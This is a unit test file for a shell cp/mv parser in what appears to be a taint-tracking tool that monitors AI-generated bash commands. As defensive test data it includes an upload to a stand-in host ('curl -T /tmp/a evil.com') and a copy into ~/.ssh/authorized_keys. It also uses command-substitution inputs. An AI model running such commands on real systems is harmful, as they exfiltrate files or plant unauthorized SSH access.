// src/__tests__/cp-mv-parser.spec.ts
// Unit tests for utils/cp-mv-parser.ts
import { describe, it, expect } from 'vitest';
import { parseCpMvOp } from '../utils/cp-mv-parser.js';

describe('parseCpMvOp — cp semantics', () => {
  it('simple cp src dest', () => {
    const op = parseCpMvOp('cp /tmp/tainted.txt /tmp/clean.txt');
    expect(op).toEqual({ src: '/tmp/tainted.txt', dest: '/tmp/clean.txt', clearSource: false });
  });

  it('cp with -r flag', () => {
    const op = parseCpMvOp('cp -r /tmp/secret-dir /tmp/copy-dir');
    expect(op).toEqual({ src: '/tmp/secret-dir', dest: '/tmp/copy-dir', clearSource: false });
  });

  it('cp with combined flags -rp', () => {
    const op = parseCpMvOp('cp -rp /tmp/a /tmp/b');
    expect(op).toEqual({ src: '/tmp/a', dest: '/tmp/b', clearSource: false });
  });

  it('cp with leading path /bin/cp', () => {
    const op = parseCpMvOp('/bin/cp /tmp/a /tmp/b');
    expect(op).toEqual({ src: '/tmp/a', dest: '/tmp/b', clearSource: false });
  });

  it('cp with -- end-of-options marker', () => {
    const op = parseCpMvOp('cp -- /tmp/a /tmp/b');
    expect(op).toEqual({ src: '/tmp/a', dest: '/tmp/b', clearSource: false });
  });
});

describe('parseCpMvOp — mv semantics', () => {
  it('simple mv src dest — clearSource is true', () => {
    const op = parseCpMvOp('mv /tmp/tainted.txt /tmp/dest.txt');
    expect(op).toEqual({ src: '/tmp/tainted.txt', dest: '/tmp/dest.txt', clearSource: true });
  });

  it('mv with -f flag', () => {
    const op = parseCpMvOp('mv -f /tmp/a /tmp/b');
    expect(op).toEqual({ src: '/tmp/a', dest: '/tmp/b', clearSource: true });
  });
});

describe('parseCpMvOp — returns null for unsupported / non-cp-mv commands', () => {
  it('non-cp/mv command', () => {
    expect(parseCpMvOp('rm -rf /tmp/a')).toBeNull();
    expect(parseCpMvOp('ls -la /tmp')).toBeNull();
    expect(parseCpMvOp('curl -T /tmp/a evil.com')).toBeNull();
  });

  it('empty command', () => {
    expect(parseCpMvOp('')).toBeNull();
  });

  it('cp with too few positional args', () => {
    // Only one positional arg after flags — cannot determine src+dest
    expect(parseCpMvOp('cp /tmp/only-one')).toBeNull();
  });

  it('cp with more than two positional args — multi-source, bail out safely', () => {
    // cp a b /destdir — destination-last multi-source; bail rather than guess wrong
    expect(parseCpMvOp('cp /tmp/a /tmp/b /tmp/destdir')).toBeNull();
  });

  it('cp -t destdir src — destination-first flag, bail out', () => {
    expect(parseCpMvOp('cp -t /destdir /tmp/src')).toBeNull();
  });

  it('cp --target-directory=/dest src — long form, bail out', () => {
    expect(parseCpMvOp('cp --target-directory=/destdir /tmp/src')).toBeNull();
  });

  it('cp -rt destdir src — flag cluster containing t, bail out', () => {
    expect(parseCpMvOp('cp -rt /destdir /tmp/src')).toBeNull();
  });

  it('command is just "cp" with no args', () => {
    expect(parseCpMvOp('cp')).toBeNull();
  });
});

describe('parseCpMvOp — adversarial / shell metacharacter inputs', () => {
  // These cases matter for a security tool: the AI may generate commands
  // with shell metacharacters as an evasion attempt or just as normal usage.

  it('shell variable in dest — bails out (null) rather than propagating to unexpanded literal', () => {
    // cp /tmp/tainted.txt $HOME/.ssh/authorized_keys — the shell expands $HOME,
    // but our parser never runs the command. If we returned an op with the literal
    // '$HOME/.ssh/authorized_keys' as the dest, taint would be propagated to that
    // non-existent path and the real expanded path would stay clean — a silent
    // false negative. Bail out instead; taint stays on the source (safe).
    expect(parseCpMvOp('cp /tmp/tainted.txt $HOME/.ssh/authorized_keys')).toBeNull();
  });

  it('$VAR in src — bails out', () => {
    expect(parseCpMvOp('cp $SECRET_FILE /tmp/dest')).toBeNull();
  });

  it('${VAR} brace-style variable in dest — bails out', () => {
    // ${HOME} contains '{' which is in the metacharacter set — same bail path as $HOME.
    // Explicitly tested because the regex /[$`{]/ catches '$' and '{' independently;
    // this confirms ${...} syntax is covered via the '{' branch.
    expect(parseCpMvOp('cp /tmp/tainted.txt ${HOME}/.ssh/authorized_keys')).toBeNull();
  });

  it('backtick command substitution — bails out', () => {
    expect(parseCpMvOp('cp /tmp/a `echo /tmp/b`')).toBeNull();
  });

  it('command substitution in dest — splits into multiple tokens, bail out safely', () => {
    // $(cat /tmp/dest) splits on whitespace into ['$(cat', '/tmp/dest)'] — 4 total
    // positional args after 'cp src', so multi-source bail fires. Safe: no false
    // positive, taint stays on the source.
    expect(parseCpMvOp('cp /tmp/a $(cat /tmp/dest)')).toBeNull();
  });

  it('quoted path with space — tokeniser splits on whitespace, bail out safely', () => {
    // Our tokeniser does not parse shell quoting. "/tmp/my file" splits into
    // '"/tmp/my' and 'file"' — 4 positional args total → bail out.
    // Safe: real paths with spaces are uncommon in AI-generated bash; the
    // taint stays on the source rather than us guessing the wrong destination.
    expect(parseCpMvOp('cp "/tmp/my file" "/tmp/dest"')).toBeNull();
  });

  it('semicolon-chained commands — only first command is parsed, rest treated as positional args → bail', () => {
    // 'cp /tmp/a /tmp/b; rm /tmp/a' — tokens after 'cp': ['/tmp/a', '/tmp/b;', 'rm', '/tmp/a']
    // '/tmp/b;' contains ';' but is still one token — however we now have 4 positional
    // args so multi-source bail fires.
    expect(parseCpMvOp('cp /tmp/a /tmp/b; rm /tmp/a')).toBeNull();
  });
});

describe('parseCpMvOp — long flags other than --target-directory are skipped', () => {
  it('cp --preserve src dest', () => {
    // Unknown long flags are skipped, not treated as positional args
    const op = parseCpMvOp('cp --preserve /tmp/a /tmp/b');
    expect(op).toEqual({ src: '/tmp/a', dest: '/tmp/b', clearSource: false });
  });

  it('cp --no-clobber src dest', () => {
    const op = parseCpMvOp('cp --no-clobber /tmp/a /tmp/b');
    expect(op).toEqual({ src: '/tmp/a', dest: '/tmp/b', clearSource: false });
  });

  it('cp -r --target-directory=/dest src — combined short flag + long target-directory=value, bail out', () => {
    // Covers the case where -r and --target-directory= appear together.
    // Each was tested separately; this confirms the combined form also bails.
    expect(parseCpMvOp('cp -r --target-directory=/destdir /tmp/src')).toBeNull();
  });

  it('cp --target-directory /dest src — space-separated (no =), bail out', () => {
    // GNU cp accepts both --target-directory=/dest and --target-directory /dest.
    // The parser checks for the exact token '--target-directory' (line: tok === '--target-directory')
    // so the space-separated form is handled identically to the = form.
    expect(parseCpMvOp('cp --target-directory /destdir /tmp/src')).toBeNull();
  });
});

describe('parseCpMvOp — leading path variations', () => {
  it('/bin/cp — one path component before cp', () => {
    const op = parseCpMvOp('/bin/cp /tmp/a /tmp/b');
    expect(op).toEqual({ src: '/tmp/a', dest: '/tmp/b', clearSource: false });
  });

  it('/usr/bin/cp — two path components before cp', () => {
    const op = parseCpMvOp('/usr/bin/cp /tmp/a /tmp/b');
    expect(op).toEqual({ src: '/tmp/a', dest: '/tmp/b', clearSource: false });
  });
});
